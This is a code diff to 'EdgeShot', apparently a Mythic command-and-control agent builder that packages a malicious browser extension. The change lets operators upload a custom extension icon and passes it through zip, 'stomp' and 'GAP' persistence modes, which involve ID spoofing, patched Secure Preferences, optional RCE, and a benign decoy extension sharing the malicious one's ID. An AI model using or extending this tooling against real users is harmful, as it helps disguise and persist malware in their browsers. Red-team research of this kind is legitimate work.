@@ -133,6 +133,12 @@ class EdgeShotAgent(PayloadType):
             required=False,
         ),
         BuildParameter(
+            name="extension_icon",
+            parameter_type=BuildParameterType.File,
+            description="Custom extension icon (PNG/JPEG, any size). Empty = the default EdgeShot logo.",
+            required=False,
+        ),
+        BuildParameter(
             name="device_id",
             parameter_type=BuildParameterType.String,
             description="Windows SID or machine UUID of the target (stomp/GAP modes)",
@@ -142,7 +148,7 @@ class EdgeShotAgent(PayloadType):
         BuildParameter(
             name="target_dir",
             parameter_type=BuildParameterType.String,
-            description="Deployment root on the target (stomp/GAP modes). Empty = platform default.",
+            description="Deployment root on the target (stomp/GAP modes). Empty = platform default (Windows: C:\\ProgramData\\EdgeShot, macOS/Linux: /tmp/.edgeshot).",
             required=False,
             default_value="",
         ),
@@ -231,6 +237,54 @@ class EdgeShotAgent(PayloadType):
                 return content.encode("utf-8")
         raise ValueError(f"Unexpected file content type: {type(content)}")
 
+    @staticmethod
+    def _render_icons(raw: bytes) -> dict:
+        """Resize an uploaded image into the 16/48/128 extension icons (Pillow).
+
+        Returns {filename: PNG bytes}. The image is centre-cropped to a square,
+        so any aspect ratio is accepted. Pillow ships in the agent container
+        (added in the Dockerfile), not in the base Mythic image.
+        """
+        import io as _io
+        from PIL import Image
+
+        img = Image.open(_io.BytesIO(raw)).convert("RGBA")
+        w, h = img.size
+        side = min(w, h)
+        left, top = (w - side) // 2, (h - side) // 2
+        img = img.crop((left, top, left + side, top + side))
+
+        out = {}
+        for size in (16, 48, 128):
+            buf = _io.BytesIO()
+            img.resize((size, size), Image.LANCZOS).save(buf, "PNG", optimize=True)
+            out[f"icon{size}.png"] = buf.getvalue()
+        return out
+
+    async def _resolve_icons(self, extension_icon_id) -> dict:
+        """Return {filename: PNG bytes} for the extension icons.
+
+        When the operator uploaded a custom icon (build parameter
+        ``extension_icon``), it is resized to 16/48/128; otherwise the committed
+        EdgeShot logo icons are used.
+        """
+        if extension_icon_id:
+            raw = await self._read_uploaded_file(extension_icon_id)
+            try:
+                return self._render_icons(raw)
+            except Exception as e:
+                raise ValueError(
+                    f"Could not decode the uploaded extension icon: {e}. "
+                    "Upload a valid PNG or JPEG image."
+                )
+        icons = {}
+        icons_dir = self.agent_code_path / "icons"
+        if icons_dir.exists():
+            for f in icons_dir.rglob("*.png"):
+                if f.is_file():
+                    icons[f.name] = f.read_bytes()
+        return icons
+
     def _default_target_dir(self, platform: str) -> str:
         if platform == "windows":
             return r"C:\ProgramData\EdgeShot"
@@ -251,16 +305,13 @@ class EdgeShotAgent(PayloadType):
             "darwin": "darwin",
         }.get(os_value, "windows")
 
-    def _add_agent_files(self, zout, prefix: str, js_code: str, manifest_code: str, rce_enabled: bool) -> None:
+    def _add_agent_files(self, zout, prefix: str, js_code: str, manifest_code: str, rce_enabled: bool, icons: dict) -> None:
         """Bundle manifest.json + background.js (+ icons, + RCE source) under ``prefix``."""
         zout.writestr(f"{prefix}/manifest.json", manifest_code)
         zout.writestr(f"{prefix}/background.js", js_code)
 
-        icons_dir = self.agent_code_path / "icons"
-        if icons_dir.exists():
-            for icon in icons_dir.rglob("*"):
-                if icon.is_file():
-                    zout.writestr(f"{prefix}/icons/{icon.name}", icon.read_bytes())
+        for name, data in (icons or {}).items():
+            zout.writestr(f"{prefix}/icons/{name}", data)
 
         if rce_enabled:
             rce_dir = self.agent_code_path / "rce"
@@ -287,6 +338,7 @@ class EdgeShotAgent(PayloadType):
             target_dir = (self.get_parameter("target_dir") or "").strip()
             platform = self._selected_os_platform()
             secure_preferences_id = self.get_parameter("secure_preferences")
+            extension_icon_id = self.get_parameter("extension_icon")
             # Boolean build params may arrive as a Python bool or a "true"/"false" string.
             rce_enabled = self.get_parameter("enable_rce") in (True, "true", "True", "1", 1)
             obfuscate = self.get_parameter("obfuscate") in (True, "true", "True", "1", 1)
@@ -387,12 +439,16 @@ class EdgeShotAgent(PayloadType):
                 "{{NATIVE_MESSAGING}}", '"nativeMessaging",' if rce_enabled else ""
             )
 
-            # --- 3. Dispatch by deployment mode -----------------------------
+            # --- 3. Resolve extension icons (custom upload or default logo) --
+            icons = await self._resolve_icons(extension_icon_id)
+
+            # --- 4. Dispatch by deployment mode -----------------------------
             if deployment_mode == "zip":
                 payload, build_message = self._build_zip(
                     manifest_code=manifest_code,
                     js_code=js_code,
                     rce_enabled=rce_enabled,
+                    icons=icons,
                     get_url=get_url,
                     post_url=post_url,
                 )
@@ -401,6 +457,7 @@ class EdgeShotAgent(PayloadType):
                     manifest_code=manifest_code,
                     js_code=js_code,
                     rce_enabled=rce_enabled,
+                    icons=icons,
                     browser_target=browser_target,
                     spoof_id=spoof_id,
                     device_id=device_id,
@@ -415,6 +472,7 @@ class EdgeShotAgent(PayloadType):
                     manifest_code=manifest_code,
                     js_code=js_code,
                     rce_enabled=rce_enabled,
+                    icons=icons,
                     browser_target=browser_target,
                     spoof_id=spoof_id,
                     device_id=device_id,
@@ -443,16 +501,13 @@ class EdgeShotAgent(PayloadType):
     # Mode: zip
     # ------------------------------------------------------------------
 
-    def _build_zip(self, *, manifest_code, js_code, rce_enabled, get_url, post_url):
+    def _build_zip(self, *, manifest_code, js_code, rce_enabled, icons, get_url, post_url):
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zout:
             zout.writestr("manifest.json", manifest_code)
             zout.writestr("background.js", js_code)
-            icons_dir = self.agent_code_path / "icons"
-            if icons_dir.exists():
-                for icon in icons_dir.rglob("*"):
-                    if icon.is_file():
-                        zout.write(icon, icon.relative_to(self.agent_code_path))
+            for name, data in (icons or {}).items():
+                zout.writestr(f"icons/{name}", data)
             if rce_enabled:
                 rce_dir = self.agent_code_path / "rce"
                 if rce_dir.exists():
@@ -476,7 +531,7 @@ class EdgeShotAgent(PayloadType):
     # Mode: stomp
     # ------------------------------------------------------------------
 
-    async def _build_stomp(self, *, manifest_code, js_code, rce_enabled, browser_target,
+    async def _build_stomp(self, *, manifest_code, js_code, rce_enabled, icons, browser_target,
                            spoof_id, device_id, target_dir, platform, secure_preferences_id,
                            get_url, post_url):
         from edgeshot.mythic.deploy import prefs as deploy_prefs
@@ -534,7 +589,7 @@ class EdgeShotAgent(PayloadType):
         with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zout:
             zout.writestr("SecurePreferencesClean", prefs_raw)
             zout.writestr("Secure Preferences", patched_bytes)
-            self._add_agent_files(zout, ext_root, js_code, manifest_code_keyed, rce_enabled)
+            self._add_agent_files(zout, ext_root, js_code, manifest_code_keyed, rce_enabled, icons)
             zout.writestr(script_filename, script_text)
 
         build_message = (
@@ -549,7 +604,7 @@ class EdgeShotAgent(PayloadType):
     # Mode: GAP (Ghost Anchor Persistence)
     # ------------------------------------------------------------------
 
-    async def _build_gap(self, *, manifest_code, js_code, rce_enabled, browser_target,
+    async def _build_gap(self, *, manifest_code, js_code, rce_enabled, icons, browser_target,
                          spoof_id, device_id, target_dir, platform, secure_preferences_id,
                          get_url, post_url):
         from edgeshot.mythic.deploy import prefs as deploy_prefs
@@ -624,10 +679,14 @@ class EdgeShotAgent(PayloadType):
             zout.writestr("Secure Preferences A", prefs_a_bytes)
             zout.writestr("Secure Preferences B", prefs_b_bytes)
             # Malicious extension A (background.js + icons + optional RCE source).
-            self._add_agent_files(zout, "extension_malicious", js_code, manifest_code_keyed, rce_enabled)
+            self._add_agent_files(zout, "extension_malicious", js_code, manifest_code_keyed, rce_enabled, icons)
             # Benign decoy B: same ID, inert worker (re-anchors to A's cached worker).
             zout.writestr("extension_benign/manifest.json", benign_code_keyed)
             zout.writestr("extension_benign/background.js", benign_bg_code)
+            # The benign manifest is derived from the malicious one, so it also
+            # references icons/*.png — ship them so the decoy loads cleanly.
+            for name, data in (icons or {}).items():
+                zout.writestr(f"extension_benign/icons/{name}", data)
             zout.writestr(script_filename, script_text)
 
         build_message = (
